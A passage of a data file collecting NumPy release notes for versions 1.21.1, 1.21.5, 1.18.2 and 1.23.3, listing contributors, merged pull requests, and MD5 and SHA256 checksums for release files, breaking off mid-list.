fd7d7409fa643a91d0a05c7554dd68aa9c9bb16e186f6ccfe40d6e003156e33a  numpy-1.21.1-cp37-cp37m-manylinux_2_12_i686.manylinux2010_i686.whl\n    a75b4498b1e93d8b700282dc8e655b8bd559c0904b3910b144646dbbbc03e062  numpy-1.21.1-cp37-cp37m-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    1412aa0aec3e00bc23fbb8664d76552b4efde98fb71f60737c83efbac24112f1  numpy-1.21.1-cp37-cp37m-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    e46ceaff65609b5399163de5893d8f2a82d3c77d5e56d976c8b5fb01faa6b671  numpy-1.21.1-cp37-cp37m-manylinux_2_5_i686.manylinux1_i686.whl\n    c6a2324085dd52f96498419ba95b5777e40b6bcbc20088fddb9e8cbb58885e8e  numpy-1.21.1-cp37-cp37m-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    73101b2a1fef16602696d133db402a7e7586654682244344b8329cdcbbb82172  numpy-1.21.1-cp37-cp37m-win32.whl\n    7a708a79c9a9d26904d1cca8d383bf869edf6f8e7650d85dbc77b041e8c5a0f8  numpy-1.21.1-cp37-cp37m-win_amd64.whl\n    95b995d0c413f5d0428b3f880e8fe1660ff9396dcd1f9eedbc311f37b5652e16  numpy-1.21.1-cp38-cp38-macosx_10_9_universal2.whl\n    635e6bd31c9fb3d475c8f44a089569070d10a9ef18ed13738b03049280281267  numpy-1.21.1-cp38-cp38-macosx_10_9_x86_64.whl\n    4a3d5fb89bfe21be2ef47c0614b9c9c707b7362386c9a3ff1feae63e0267ccb6  numpy-1.21.1-cp38-cp38-macosx_11_0_arm64.whl\n    8a326af80e86d0e9ce92bcc1e65c8ff88297de4fa14ee936cb2293d414c9ec63  numpy-1.21.1-cp38-cp38-manylinux_2_12_i686.manylinux2010_i686.whl\n    791492091744b0fe390a6ce85cc1bf5149968ac7d5f0477288f78c89b385d9af  numpy-1.21.1-cp38-cp38-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    0318c465786c1f63ac05d7c4dbcecd4d2d7e13f0959b01b534ea1e92202235c5  numpy-1.21.1-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    9a513bd9c1551894ee3d31369f9b07460ef223694098cf27d399513415855b68  numpy-1.21.1-cp38-cp38-manylinux_2_5_i686.manylinux1_i686.whl\n    91c6f5fc58df1e0a3cc0c3a717bb3308ff850abdaa6d2d802573ee2b11f674a8  numpy-1.21.1-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    978010b68e17150db8765355d1ccdd450f9fc916824e8c4e35ee620590e234cd  numpy-1.21.1-cp38-cp38-win32.whl\n    9749a40a5b22333467f02fe11edc98f022133ee1bfa8ab99bda5e5437b831214  numpy-1.21.1-cp38-cp38-win_amd64.whl\n    d7a4aeac3b94af92a9373d6e77b37691b86411f9745190d2c351f410ab3a791f  numpy-1.21.1-cp39-cp39-macosx_10_9_universal2.whl\n    d9e7912a56108aba9b31df688a4c4f5cb0d9d3787386b87d504762b6754fbb1b  numpy-1.21.1-cp39-cp39-macosx_10_9_x86_64.whl\n    25b40b98ebdd272bc3020935427a4530b7d60dfbe1ab9381a39147834e985eac  numpy-1.21.1-cp39-cp39-macosx_11_0_arm64.whl\n    8a92c5aea763d14ba9d6475803fc7904bda7decc2a0a68153f587ad82941fec1  numpy-1.21.1-cp39-cp39-manylinux_2_12_i686.manylinux2010_i686.whl\n    05a0f648eb28bae4bcb204e6fd14603de2908de982e761a2fc78efe0f19e96e1  numpy-1.21.1-cp39-cp39-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    f01f28075a92eede918b965e86e8f0ba7b7797a95aa8d35e1cc8821f5fc3ad6a  numpy-1.21.1-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    88c0b89ad1cc24a5efbb99ff9ab5db0f9a86e9cc50240177a571fbe9c2860ac2  numpy-1.21.1-cp39-cp39-win32.whl\n    01721eefe70544d548425a07c80be8377096a54118070b8a62476866d5208e33  numpy-1.21.1-cp39-cp39-win_amd64.whl\n    2d4d1de6e6fb3d28781c73fbde702ac97f03d79e4ffd6598b880b2d95d62ead4  numpy-1.21.1-pp37-pypy37_pp73-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    504ced5d900fd5724c74ebf5dbb03572c04074bec9baa24b5646c66a2450e654  numpy-1.21.1.tar.gz\n    dff4af63638afcc57a3dfb9e4b26d434a7a602d225b42d746ea7fe2edf1342fd  numpy-1.21.1.zip\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.21.5": "==========================\n\nNumPy 1.21.5 is a maintenance release that fixes a few bugs discovered after\nthe 1.21.4 release and does some maintenance to extend the 1.21.x lifetime.\nThe Python versions supported in this release are 3.7-3.10. If you want to\ncompile your own version using gcc-11, you will need to use gcc-11.2+ to avoid\nproblems.\n\nContributors\n============\n\nA total of 7 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Bas van Beek\n* Charles Harris\n* Matti Picus\n* Rohit Goswami\n* Ross Barnowski\n* Sayed Adel\n* Sebastian Berg\n\nPull requests merged\n====================\n\nA total of 11 pull requests were merged for this release.\n\n* `20357 <https://github.com/numpy/numpy/pull/20357>`__: MAINT: Do not forward ``__(deep)copy__`` calls of ``_GenericAlias``...\n* `20462 <https://github.com/numpy/numpy/pull/20462>`__: BUG: Fix float16 einsum fastpaths using wrong tempvar\n* `20463 <https://github.com/numpy/numpy/pull/20463>`__: BUG, DIST: Print os error message when the executable not exist\n* `20464 <https://github.com/numpy/numpy/pull/20464>`__: BLD: Verify the ability to compile C++ sources before initiating...\n* `20465 <https://github.com/numpy/numpy/pull/20465>`__: BUG: Force ``npymath` ` to respect ``npy_longdouble``\n* `20466 <https://github.com/numpy/numpy/pull/20466>`__: BUG: Fix failure to create aligned, empty structured dtype\n* `20467 <https://github.com/numpy/numpy/pull/20467>`__: ENH: provide a convenience function to replace npy_load_module\n* `20495 <https://github.com/numpy/numpy/pull/20495>`__: MAINT: update wheel to version that supports python3.10\n* `20497 <https://github.com/numpy/numpy/pull/20497>`__: BUG: Clear errors correctly in F2PY conversions\n* `20613 <https://github.com/numpy/numpy/pull/20613>`__: DEV: add a warningfilter to fix pytest workflow.\n* `20618 <https://github.com/numpy/numpy/pull/20618>`__: MAINT: Help boost::python libraries at least not crash\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    e00a3c2e1461dd2920ab4af6b753d3da  numpy-1.21.5-cp310-cp310-macosx_10_9_universal2.whl\n    50e0526fa29110fb6033fa8285fba4e1  numpy-1.21.5-cp310-cp310-macosx_10_9_x86_64.whl\n    bdbb19e7656d66250aa67bd1c7924764  numpy-1.21.5-cp310-cp310-macosx_11_0_arm64.whl\n    c5c982a07797c8963b8fec44aae6db09  numpy-1.21.5-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    8b27b622f58caeeb7f14472651d655e3  numpy-1.21.5-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    e545f6f85f950f57606efcaeeac2e50a  numpy-1.21.5-cp310-cp310-win_amd64.whl\n    5c36eefdcb039c0d4db8882fddbeb695  numpy-1.21.5-cp37-cp37m-macosx_10_9_x86_64.whl\n    b5d080e0fd8b658419b3636f1cf5dc3a  numpy-1.21.5-cp37-cp37m-manylinux_2_12_i686.manylinux2010_i686.whl\n    ec1a9a1333a2bf61897f105ecd9f212a  numpy-1.21.5-cp37-cp37m-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    d5ab050300748f20cdc9c6e17ba8ffd4  numpy-1.21.5-cp37-cp37m-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    b7498a1d0ea7273ef1af56d58e02a550  numpy-1.21.5-cp37-cp37m-win32.whl\n    f55c7ecfd35769fb3f6a408c0c123372  numpy-1.21.5-cp37-cp37m-win_amd64.whl\n    843e3431ba4b56d3fc36b7c4cb6fc10c  numpy-1.21.5-cp38-cp38-macosx_10_9_universal2.whl\n    4721e71bdc5697d310cd3a6b6cd60741  numpy-1.21.5-cp38-cp38-macosx_10_9_x86_64.whl\n    2169fb8ed40046e1e33d187fc85b91bb  numpy-1.21.5-cp38-cp38-macosx_11_0_arm64.whl\n    52de43977749109509ee708a142a7d97  numpy-1.21.5-cp38-cp38-manylinux_2_12_i686.manylinux2010_i686.whl\n    703c0f54c5ede8cc0c648ef66cafac47  numpy-1.21.5-cp38-cp38-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    50432f9cf1d5b2278ceb7a96890353ed  numpy-1.21.5-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    0c4c5336136e045d02c60ba8115eb6a2  numpy-1.21.5-cp38-cp38-win32.whl\n    c2e0744164f8255be70725ef42bc3f5b  numpy-1.21.5-cp38-cp38-win_amd64.whl\n    b16dd7103117d051cb6c3b6c4434f7d2  numpy-1.21.5-cp39-cp39-macosx_10_9_universal2.whl\n    220dd07273aeb0b2ca8f0e4f543e43c3  numpy-1.21.5-cp39-cp39-macosx_10_9_x86_64.whl\n    1dd09ad75eff93b274f650871e0b9287  numpy-1.21.5-cp39-cp39-macosx_11_0_arm64.whl\n    6801263f51d3b13420b59ff84c716869  numpy-1.21.5-cp39-cp39-manylinux_2_12_i686.manylinux2010_i686.whl\n    035bde3955ae2f62ada65084d71a7421  numpy-1.21.5-cp39-cp39-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    09f202576cbd0ed6121cff10cdea831a  numpy-1.21.5-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    c6a44c90c2d5124fea6cedbbf575e252  numpy-1.21.5-cp39-cp39-win32.whl\n    bbc11e31406a9fc48c18a41259bc8866  numpy-1.21.5-cp39-cp39-win_amd64.whl\n    5be2b6f6cf6fb3a3d98231e891260624  numpy-1.21.5-pp37-pypy37_pp73-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    8bc9ff24bac9bf4268372cefea8f0b6b  numpy-1.21.5.tar.gz\n    88b5438ded7992fa2e6a810d43cd32a1  numpy-1.21.5.zip\n\nSHA256\n------\n::\n\n    301e408a052fdcda5cdcf03021ebafc3c6ea093021bf9d1aa47c54d48bdad166  numpy-1.21.5-cp310-cp310-macosx_10_9_universal2.whl\n    a7e8f6216f180f3fd4efb73de5d1eaefb5f5a1ee5b645c67333033e39440e63a  numpy-1.21.5-cp310-cp310-macosx_10_9_x86_64.whl\n    fc7a7d7b0ed72589fd8b8486b9b42a564f10b8762be8bd4d9df94b807af4a089  numpy-1.21.5-cp310-cp310-macosx_11_0_arm64.whl\n    58ca1d7c8aef6e996112d0ce873ac9dfa1eaf4a1196b4ff7ff73880a09923ba7  numpy-1.21.5-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    dc4b2fb01f1b4ddbe2453468ea0719f4dbb1f5caa712c8b21bb3dd1480cd30d9  numpy-1.21.5-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    cc1b30205d138d1005adb52087ff45708febbef0e420386f58664f984ef56954  numpy-1.21.5-cp310-cp310-win_amd64.whl\n    08de8472d9f7571f9d51b27b75e827f5296295fa78817032e84464be8bb905bc  numpy-1.21.5-cp37-cp37m-macosx_10_9_x86_64.whl\n    4fe6a006557b87b352c04596a6e3f12a57d6e5f401d804947bd3188e6b0e0e76  numpy-1.21.5-cp37-cp37m-manylinux_2_12_i686.manylinux2010_i686.whl\n    3d893b0871322eaa2f8c7072cdb552d8e2b27645b7875a70833c31e9274d4611  numpy-1.21.5-cp37-cp37m-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    341dddcfe3b7b6427a28a27baa59af5ad51baa59bfec3264f1ab287aa3b30b13  numpy-1.21.5-cp37-cp37m-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    ca9c23848292c6fe0a19d212790e62f398fd9609aaa838859be8459bfbe558aa  numpy-1.21.5-cp37-cp37m-win32.whl\n    025b497014bc33fc23897859350f284323f32a2fff7654697f5a5fc2a19e9939  numpy-1.21.5-cp37-cp37m-win_amd64.whl\n    3a5098df115340fb17fc93867317a947e1dcd978c3888c5ddb118366095851f8  numpy-1.21.5-cp38-cp38-macosx_10_9_universal2.whl\n    311283acf880cfcc20369201bd75da907909afc4666966c7895cbed6f9d2c640  numpy-1.21.5-cp38-cp38-macosx_10_9_x86_64.whl\n    b545ebadaa2b878c8630e5bcdb97fc4096e779f335fc0f943547c1c91540c815  numpy-1.21.5-cp38-cp38-macosx_11_0_arm64.whl\n    c5562bcc1a9b61960fc8950ade44d00e3de28f891af0acc96307c73613d18f6e  numpy-1.21.5-cp38-cp38-manylinux_2_12_i686.manylinux2010_i686.whl\n    eed2afaa97ec33b4411995be12f8bdb95c87984eaa28d76cf628970c8a2d689a  numpy-1.21.5-cp38-cp38-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    61bada43d494515d5b122f4532af226fdb5ee08fe5b5918b111279843dc6836a  numpy-1.21.5-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    7b9d6b14fc9a4864b08d1ba57d732b248f0e482c7b2ff55c313137e3ed4d8449  numpy-1.21.5-cp38-cp38-win32.whl\n    dbce7adeb66b895c6aaa1fad796aaefc299ced597f6fbd9ceddb0dd735245354  numpy-1.21.5-cp38-cp38-win_amd64.whl\n    507c05c7a37b3683eb08a3ff993bd1ee1e6c752f77c2f275260533b265ecdb6c  numpy-1.21.5-cp39-cp39-macosx_10_9_universal2.whl\n    00c9fa73a6989895b8815d98300a20ac993c49ac36c8277e8ffeaa3631c0dbbb  numpy-1.21.5-cp39-cp39-macosx_10_9_x86_64.whl\n    69a5a8d71c308d7ef33ef72371c2388a90e3495dbb7993430e674006f94797d5  numpy-1.21.5-cp39-cp39-macosx_11_0_arm64.whl\n    2d8adfca843bc46ac199a4645233f13abf2011a0b2f4affc5c37cd552626f27b  numpy-1.21.5-cp39-cp39-manylinux_2_12_i686.manylinux2010_i686.whl\n    c293d3c0321996cd8ffe84215ffe5d269fd9d1d12c6f4ffe2b597a7c30d3e593  numpy-1.21.5-cp39-cp39-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    3c978544be9e04ed12016dd295a74283773149b48f507d69b36f91aa90a643e5  numpy-1.21.5-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    2a9add27d7fc0fdb572abc3b2486eb3b1395da71e0254c5552b2aad2a18b5441  numpy-1.21.5-cp39-cp39-win32.whl\n    1964db2d4a00348b7a60ee9d013c8cb0c566644a589eaa80995126eac3b99ced  numpy-1.21.5-cp39-cp39-win_amd64.whl\n    a7c4b701ca418cd39e28ec3b496e6388fe06de83f5f0cb74794fa31cfa384c02  numpy-1.21.5-pp37-pypy37_pp73-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    1a7ee0ffb35dc7489aebe5185a483f4c43b0d2cf784c3c9940f975a7dde56506  numpy-1.21.5.tar.gz\n    6a5928bc6241264dce5ed509e66f33676fc97f464e7a919edc672fb5532221ee  numpy-1.21.5.zip\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.18.2": "==========================\n\nThis small elease contains a fix for a performance regression in numpy/random\nand several bug/maintenance updates.\n\nThe Python versions supported in this release are 3.5-3.8. Downstream\ndevelopers should use Cython >= 0.29.15 for Python 3.8 support and OpenBLAS >=\n3.7 to avoid errors on the Skylake architecture.\n\n\nContributors\n============\n\nA total of 5 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Charles Harris\n* Ganesh Kathiresan +\n* Matti Picus\n* Sebastian Berg\n* przemb +\n\n\nPull requests merged\n====================\n\nA total of 7 pull requests were merged for this release.\n\n* `15675 <https://github.com/numpy/numpy/pull/15675>`__: TST: move _no_tracing to testing._private\n* `15676 <https://github.com/numpy/numpy/pull/15676>`__: MAINT: Large overhead in some random functions\n* `15677 <https://github.com/numpy/numpy/pull/15677>`__: TST: Do not create gfortran link in azure Mac testing.\n* `15679 <https://github.com/numpy/numpy/pull/15679>`__: BUG: Added missing error check in `ndarray.__contains__`\n* `15722 <https://github.com/numpy/numpy/pull/15722>`__: MAINT: use list-based APIs to call subprocesses\n* `15729 <https://github.com/numpy/numpy/pull/15729>`__: REL: Prepare for 1.18.2 release.\n* `15734 <https://github.com/numpy/numpy/pull/15734>`__: BUG: fix logic error when nm fails on 32-bit\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    b9efe544f2bfbbd4e226c5639f22b1d2  numpy-1.18.2-cp35-cp35m-macosx_10_9_x86_64.whl\n    59c0bc09053c0029e829685dcb3dafa5  numpy-1.18.2-cp35-cp35m-manylinux1_i686.whl\n    1783f9194ceeabb236bd46ed6cb6ed60  numpy-1.18.2-cp35-cp35m-manylinux1_x86_64.whl\n    8a6fa57b509e6d9e194fb43b0ac5bbc7  numpy-1.18.2-cp35-cp35m-win32.whl\n    3167feeb5e30445ca7beed1d55b6d73a  numpy-1.18.2-cp35-cp35m-win_amd64.whl\n    c193d593d3b8a46c610511a69c86f879  numpy-1.18.2-cp36-cp36m-macosx_10_9_x86_64.whl\n    f31c65b4699b12e73b36eb268931dbdc  numpy-1.18.2-cp36-cp36m-manylinux1_i686.whl\n    f5b0613cacaaf2179528a36b75712d65  numpy-1.18.2-cp36-cp36m-manylinux1_x86_64.whl\n    77e40c0481f2c1608d344032038fa969  numpy-1.18.2-cp36-cp36m-win32.whl\n    2c402211d77a10025b047042d191839b  numpy-1.18.2-cp36-cp36m-win_amd64.whl\n    3adec0f3cd5946ae7a0ab67790b2d8f1  numpy-1.18.2-cp37-cp37m-macosx_10_9_x86_64.whl\n    baea3b06dac41d5f6f1fbb7a62114656  numpy-1.18.2-cp37-cp37m-manylinux1_i686.whl\n    99b3c14bfc303c662b899d1a5ca4df6a  numpy-1.18.2-cp37-cp37m-manylinux1_x86_64.whl\n    293066cca2b3772fa3ae204f6ff98ce7  numpy-1.18.2-cp37-cp37m-win32.whl\n    21f3cda116631da8823a621e90c30bbb  numpy-1.18.2-cp37-cp37m-win_amd64.whl\n    47978cedd45ded509073025c1aa60506  numpy-1.18.2-cp38-cp38-macosx_10_9_x86_64.whl\n    4864078352c7faa69a8f9e98e48f7d8a  numpy-1.18.2-cp38-cp38-manylinux1_i686.whl\n    c0111a5fce4aa57004366e9d5edc5644  numpy-1.18.2-cp38-cp38-manylinux1_x86_64.whl\n    7f8ca4e685e607f80ad002495b603436  numpy-1.18.2-cp38-cp38-win32.whl\n    e8e192005a0b8045928f0ac712762a6f  numpy-1.18.2-cp38-cp38-win_amd64.whl\n    52601ac4cfbd513218bc088b74715098  numpy-1.18.2.tar.gz\n    511010c9fbd2516fe5a24aabcb76a56d  numpy-1.18.2.zip\n\nSHA256\n------\n::\n\n    a1baa1dc8ecd88fb2d2a651671a84b9938461e8a8eed13e2f0a812a94084d1fa  numpy-1.18.2-cp35-cp35m-macosx_10_9_x86_64.whl\n    a244f7af80dacf21054386539699ce29bcc64796ed9850c99a34b41305630286  numpy-1.18.2-cp35-cp35m-manylinux1_i686.whl\n    6fcc5a3990e269f86d388f165a089259893851437b904f422d301cdce4ff25c8  numpy-1.18.2-cp35-cp35m-manylinux1_x86_64.whl\n    b5ad0adb51b2dee7d0ee75a69e9871e2ddfb061c73ea8bc439376298141f77f5  numpy-1.18.2-cp35-cp35m-win32.whl\n    87902e5c03355335fc5992a74ba0247a70d937f326d852fc613b7f53516c0963  numpy-1.18.2-cp35-cp35m-win_amd64.whl\n    9ab21d1cb156a620d3999dd92f7d1c86824c622873841d6b080ca5495fa10fef  numpy-1.18.2-cp36-cp36m-macosx_10_9_x86_64.whl\n    cdb3a70285e8220875e4d2bc394e49b4988bdb1298ffa4e0bd81b2f613be397c  numpy-1.18.2-cp36-cp36m-manylinux1_i686.whl\n    6d205249a0293e62bbb3898c4c2e1ff8a22f98375a34775a259a0523111a8f6c  numpy-1.18.2-cp36-cp36m-manylinux1_x86_64.whl\n    a35af656a7ba1d3decdd4fae5322b87277de8ac98b7d9da657d9e212ece76a61  numpy-1.18.2-cp36-cp36m-win32.whl\n    1598a6de323508cfeed6b7cd6c4efb43324f4692e20d1f76e1feec7f59013448  numpy-1.18.2-cp36-cp36m-win_amd64.whl\n    deb529c40c3f1e38d53d5ae6cd077c21f1d49e13afc7936f7f868455e16b64a0  numpy-1.18.2-cp37-cp37m-macosx_10_9_x86_64.whl\n    cd77d58fb2acf57c1d1ee2835567cd70e6f1835e32090538f17f8a3a99e5e34b  numpy-1.18.2-cp37-cp37m-manylinux1_i686.whl\n    b1fe1a6f3a6f355f6c29789b5927f8bd4f134a4bd9a781099a7c4f66af8850f5  numpy-1.18.2-cp37-cp37m-manylinux1_x86_64.whl\n    2e40be731ad618cb4974d5ba60d373cdf4f1b8dcbf1dcf4d9dff5e212baf69c5  numpy-1.18.2-cp37-cp37m-win32.whl\n    4ba59db1fcc27ea31368af524dcf874d9277f21fd2e1f7f1e2e0c75ee61419ed  numpy-1.18.2-cp37-cp37m-win_amd64.whl\n    59ca9c6592da581a03d42cc4e270732552243dc45e87248aa8d636d53812f6a5  numpy-1.18.2-cp38-cp38-macosx_10_9_x86_64.whl\n    1b0ece94018ae21163d1f651b527156e1f03943b986188dd81bc7e066eae9d1c  numpy-1.18.2-cp38-cp38-manylinux1_i686.whl\n    82847f2765835c8e5308f136bc34018d09b49037ec23ecc42b246424c767056b  numpy-1.18.2-cp38-cp38-manylinux1_x86_64.whl\n    5e0feb76849ca3e83dd396254e47c7dba65b3fa9ed3df67c2556293ae3e16de3  numpy-1.18.2-cp38-cp38-win32.whl\n    ba3c7a2814ec8a176bb71f91478293d633c08582119e713a0c5351c0f77698da  numpy-1.18.2-cp38-cp38-win_amd64.whl\n    da204ce460aa4247e595b7c7189d2fb2ed5f796bc03197055de01dac61d0125e  numpy-1.18.2.tar.gz\n    e7894793e6e8540dbeac77c87b489e331947813511108ae097f1715c018b8f3d  numpy-1.18.2.zip\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.23.3": "==========================\nNumPy 1.23.3 is a maintenance release that fixes bugs discovered after the\n1.23.2 release. There is no major theme for this release, the main improvements\nare for some downstream builds and some annotation corner cases. The Python\nversions supported for this release are 3.8-3.11.\n\nNote that we will move to MacOS 11 for the NumPy 1.23.4 release, the 10.15\nversion currently used will no longer be supported by our build infrastructure\nat that point.\n\nContributors\n============\n\nA total of 16 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Aaron Meurer\n* Bas van Beek\n* Charles Harris\n* Ganesh Kathiresan\n* Gavin Zhang +\n* Iantra Solari+\n* Jyn Spring \u7434\u6625 +\n* Matti Picus\n* Rafael Cardoso Fernandes Sousa\n* Rafael Sousa +\n* Ralf Gommers\n* Rin Cat (\u9234\u732b) +\n* Saransh Chopra +\n* Sayed Adel\n* Sebastian Berg\n* Serge Guelton\n\nPull requests merged\n====================\n\nA total of 14 pull requests were merged for this release.\n\n* `22136 <https://github.com/numpy/numpy/pull/22136>`__: BLD: Add Python 3.11 wheels to aarch64 build\n* `22148 <https://github.com/numpy/numpy/pull/22148>`__: MAINT: Update setup.py for Python 3.11.\n* `22155 <https://github.com/numpy/numpy/pull/22155>`__: CI: Test NumPy build against old versions of GCC(6, 7, 8)\n* `22156 <https://github.com/numpy/numpy/pull/22156>`__: MAINT: support IBM i system\n* `22195 <https://github.com/numpy/numpy/pull/22195>`__: BUG: Fix circleci build\n* `22214 <https://github.com/numpy/numpy/pull/22214>`__: BUG: Expose heapsort algorithms in a shared header\n* `22215 <https://github.com/numpy/numpy/pull/22215>`__: BUG: Support using libunwind for backtrack\n* `22216 <https://github.com/numpy/numpy/pull/22216>`__: MAINT: fix an incorrect pointer type usage in f2py\n* `22220 <https://github.com/numpy/numpy/pull/22220>`__: BUG: change overloads to play nice with pyright.\n* `22221 <https://github.com/numpy/numpy/pull/22221>`__: TST,BUG: Use fork context to fix MacOS savez test\n* `22222 <https://github.com/numpy/numpy/pull/22222>`__: TYP,BUG: Reduce argument validation in C-based ``__class_getitem__``\n* `22223 <https://github.com/numpy/numpy/pull/22223>`__: TST: ensure ``np.equal.reduce`` raises a ``TypeError``\n* `22224 <https://github.com/numpy/numpy/pull/22224>`__: BUG: Fix the implementation of numpy.array_api.vecdot\n* `22230 <https://github.com/numpy/numpy/pull/22230>`__: BUG: Better report integer division overflow (backport)\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    a60bf0b1d440bf18d87c49409036d05a  numpy-1.23.3-cp310-cp310-macosx_10_9_x86_64.whl\n    59b43423a692f5351c6a43b852b210d7  numpy-1.23.3-cp310-cp310-macosx_11_0_arm64.whl\n    f482a4be6954b1b606320f0ffc1995dd  numpy-1.23.3-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    a82e2ecc4060a37dae5424e624eabfe3  numpy-1.23.3-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    84916178e5f4d073d0008754cba7f300  numpy-1.23.3-cp310-cp310-win32.whl\n    605da65b9b66dfce8b62d847cb3841f7  numpy-1.23.3-cp310-cp310-win_amd64.whl\n    57cf29f781be955a9cd0de8d07fbce56  numpy-1.23.3-cp311-cp311-macosx_10_9_x86_64.whl\n    f395dcf622dff0ba44777cbae0442189  numpy-1.23.3-cp311-cp311-macosx_11_0_arm64.whl\n    55d6a6439913ba84ad89268e0ad59fa0  numpy-1.23.3-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    202bc3a8617f479ebe60ca0dec29964b  numpy-1.23.3-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    a42c3d058bcef47b26841bf9472a89bf  numpy-1.23.3-cp311-cp311-win32.whl\n    237dbd94e5529065c0c5cc4e47ceeb7e  numpy-1.23.3-cp311-cp311-win_amd64.whl\n    d0587d5b28d3fa7e0ec8fd3df76e4bd4  numpy-1.23.3-cp38-cp38-macosx_10_9_x86_64.whl\n    054234695ed3d955fb01f661db2c14fc  numpy-1.23.3-cp38-cp38-macosx_11_0_arm64.whl\n    4e75ac61e34f1bf23e7cbd6e2bfc7a32  numpy-1.23.3-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    29ccb3a732027ee1abe23a9562c32d0c  numpy-1.23.3-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    12817838edc1e1bea27df79f3a83da5d  numpy-1.23.3-cp38-cp38-win32.whl\n    ef430e830a9fea7d8db0218b901671f6  numpy-1.23.3-cp38-cp38-win_amd64.whl\n    b001f7e17df798f9b949bbe259924c77  numpy-1.23.3-cp39-cp39-macosx_10_9_x86_64.whl\n    bc1782f5d79187d63d14ed69a6a411e9  numpy-1.23.3-cp39-cp39-macosx_11_0_arm64.whl\n    f8fb0178bc34a198d5ce4e166076e1fc  numpy-1.23.3-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    fb80d38c37aae1e4d416cd4de068ff0a  numpy-1.23.3-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    318d0a2a27b7e361295c0382a0ff4a94  numpy-1.23.3-cp39-cp39-win32.whl\n    880dc73de09fccda0650e9404fa83608  numpy-1.23.3-cp39-cp39-win_amd64.whl\n    3b5a51f78718a1a82d2750ec159f9acf  numpy-1.23.3-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    56a0c90a303979d5bf8fc57e86e57ccb  numpy-1.23.3-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    5338d997a3178750834e742a257dfa4a  numpy-1.23.3-pp38-pypy38_pp73-win_amd64.whl\n    6efc60a3f6c1b74c849d53fbcc07807b  numpy-1.23.3.tar.gz\n\nSHA256\n------\n::\n\n    c9f707b5bb73bf277d812ded9896f9512a43edff72712f31667d0a8c2f8e71ee  numpy-1.23.3-cp310-cp310-macosx_10_9_x86_64.whl\n    ffcf105ecdd9396e05a8e58e81faaaf34d3f9875f137c7372450baa5d77c9a54  numpy-1.23.3-cp310-cp310-macosx_11_0_arm64.whl\n    0ea3f98a0ffce3f8f57675eb9119f3f4edb81888b6874bc1953f91e0b1d4f440  numpy-1.23.3-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    004f0efcb2fe1c0bd6ae1fcfc69cc8b6bf2407e0f18be308612007a0762b4089  numpy-1.23.3-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    98dcbc02e39b1658dc4b4508442a560fe3ca5ca0d989f0df062534e5ca3a5c1a  numpy-1.23.3-cp310-cp310-win32.whl\n    39a664e3d26ea854211867d20ebcc8023257c1800ae89773cbba9f9e97bae036  numpy-1.23.3-cp310-cp310-win_amd64.whl\n    1f27b5322ac4067e67c8f9378b41c746d8feac8bdd0e0ffede5324667b8a075c  numpy-1.23.3-cp311-cp311-macosx_10_9_x86_64.whl\n    2ad3ec9a748a8943e6eb4358201f7e1c12ede35f510b1a2221b70af4bb64295c  numpy-1.23.3-cp311-cp311-macosx_11_0_arm64.whl\n    bdc9febce3e68b697d931941b263c59e0c74e8f18861f4064c1f712562903411  numpy-1.23.3-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    301c00cf5e60e08e04d842fc47df641d4a181e651c7135c50dc2762ffe293dbd  numpy-1.23.3-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    7cd1328e5bdf0dee621912f5833648e2daca72e3839ec1d6695e91089625f0b4  numpy-1.23.3-cp311-cp311-win32.whl\n    8355fc10fd33a5a70981a5b8a0de51d10af3688d7a9e4a34fcc8fa0d7467bb7f  